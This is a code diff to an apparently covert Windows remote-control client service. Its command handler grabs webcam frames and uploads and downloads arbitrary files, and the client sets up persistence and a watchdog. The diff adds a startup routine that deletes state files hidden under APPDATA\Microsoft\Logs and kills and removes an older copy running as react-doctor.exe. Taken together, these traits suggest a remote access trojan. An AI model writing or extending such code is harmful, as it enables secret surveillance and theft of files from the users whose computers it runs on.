@@ -282,7 +282,11 @@ def _dispatch(cmd: dict) -> dict:
         elif t == "get_camera_frame":
             if not _CV2: return {"value": ""}
             try:
-                cap = cv2.VideoCapture(0)
+                cap = cv2.VideoCapture(0, cv2.CAP_DSHOW)
+                if not cap.isOpened():
+                    cap.release()
+                    return {"value": ""}
+                time.sleep(0.2)
                 ret, frame = cap.read()
                 cap.release()
                 if not ret: return {"value": ""}
@@ -406,10 +410,11 @@ def _dispatch(cmd: dict) -> dict:
             path = p.get("path", "")
             data_b64 = p.get("data", "")
             try:
+                norm_path = os.path.normpath(path.replace("/", os.sep))
                 data = base64.b64decode(data_b64)
-                d = os.path.dirname(path)
+                d = os.path.dirname(norm_path)
                 if d and not os.path.exists(d): os.makedirs(d, exist_ok=True)
-                with open(path, "wb") as f: f.write(data)
+                with open(norm_path, "wb") as f: f.write(data)
                 return {"value": True}
             except Exception as e:
                 logger.error(f"Upload failed: {e}")
@@ -417,12 +422,15 @@ def _dispatch(cmd: dict) -> dict:
         elif t == "download_file":
             path = p.get("path", "")
             try:
-                if not os.path.exists(path): return {"value": ""}
-                with open(path, "rb") as f: data = f.read()
+                norm_path = os.path.normpath(path.replace("/", os.sep))
+                if not os.path.exists(norm_path): return {"value": ""}
+                with open(norm_path, "rb") as f: data = f.read()
                 return {"value": base64.b64encode(data).decode()}
             except Exception as e:
                 logger.error(f"Download failed: {e}")
                 return {"value": ""}
+        elif t == "cleanup_old_client":
+            return {"value": _cleanup_old_client()}
         else:
             return {"error": f"Unknown command: {t}"}
     except Exception as e:
@@ -475,6 +483,55 @@ def _setup_persistence():
     except Exception as e:
         logger.warning("Persistence setup error: %s", e)
 
+
+def _cleanup_old_client() -> dict:
+    removed = []
+    errors = []
+    try:
+        log_dir = os.path.join(os.environ.get("APPDATA", os.path.expanduser("~")), "Microsoft", "Logs")
+        for fname in ["wsh.log", "cbsvc.log", "cbid.dat"]:
+            fpath = os.path.join(log_dir, fname)
+            try:
+                if os.path.exists(fpath):
+                    os.remove(fpath)
+                    removed.append(fpath)
+            except Exception as e:
+                errors.append(f"{fpath}: {e}")
+        # Kill old client processes
+        try:
+            import psutil
+            killed = []
+            for proc in psutil.process_iter(['name', 'exe']):
+                try:
+                    name = proc.info.get('name', '').lower()
+                    exe = (proc.info.get('exe') or '').lower()
+                    if name in ('react-doctor.exe', 'cyberbridgesvc.exe') or 'react-doctor' in exe or 'cyberbridge' in exe:
+                        if proc.pid != os.getpid():
+                            proc.kill()
+                            killed.append(name or exe)
+                except Exception:
+                    pass
+            if killed:
+                removed.append(f"killed processes: {killed}")
+        except Exception as e:
+            errors.append(f"process kill: {e}")
+        try:
+            exe_dir = os.path.dirname(sys.executable) if getattr(sys, 'frozen', False) else os.path.dirname(os.path.abspath(__file__))
+            for name in ["react-doctor.exe", "CyberBridgeSvc.exe"]:
+                p = os.path.join(exe_dir, name)
+                if os.path.exists(p):
+                    try:
+                        os.remove(p)
+                        removed.append(p)
+                    except Exception:
+                        pass
+        except Exception as e:
+            errors.append(f"exe cleanup: {e}")
+    except Exception as e:
+        errors.append(str(e))
+    return {"removed": removed, "errors": errors}
+
+
 from core import watchdog, persistence
 
 def _start_watchdog_if_possible() -> bool:
@@ -521,6 +578,13 @@ class CyberBridgeClientService(win32serviceutil.ServiceFramework):
         _configure_service_recovery()
         _setup_persistence()
         _start_watchdog_if_possible()
+        # Cleanup old client artifacts on startup
+        try:
+            res = _cleanup_old_client()
+            if res.get("removed"):
+                logger.info("Cleanup removed: %s", res.get("removed"))
+        except Exception:
+            pass
         self._flag["running"] = True
 
         # Wait for initial registration
@@ -547,6 +611,12 @@ def _run_standalone():
     _setup_persistence()
     if not _start_watchdog_if_possible():
         return
+    try:
+        res = _cleanup_old_client()
+        if res.get("removed"):
+            logger.info("Cleanup removed: %s", res.get("removed"))
+    except Exception:
+        pass
     flag = {"running": True}
 
     # Register first
